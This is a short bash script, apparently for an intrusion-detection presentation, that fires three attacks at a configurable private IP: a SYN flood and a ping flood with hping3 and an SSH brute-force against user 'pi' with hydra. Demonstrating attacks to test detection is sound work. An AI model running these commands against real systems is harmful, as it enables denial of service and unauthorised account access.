# !/bin/bash
# script for ids presentation

ids=192.168.0.100 # <-- change this IP

echo "Starting presentation..."

printf "\n---1. Attack: SYN-Flooding---"

read -p "> Press enter to continue"

printf "\n attacking...\n"

sudo hping3 -i u1 -c 100000 $ids > /dev/null

printf "\n\n---2. Attack: Ping-Flooding---"

read -p "> Press enter to continue"

printf "\n attacking...\n"

sudo hping3 -1 -i u1 -c 10000 $ids > /dev/null

printf "\n\n---3. Attack: SSH-Bruteforce---"

read -p "> Press enter to continue"

printf "\n attacking...\n"

hydra -l pi -x 1:1:a ssh://$ids > /dev/null

printf "\nFinished presentation\n"
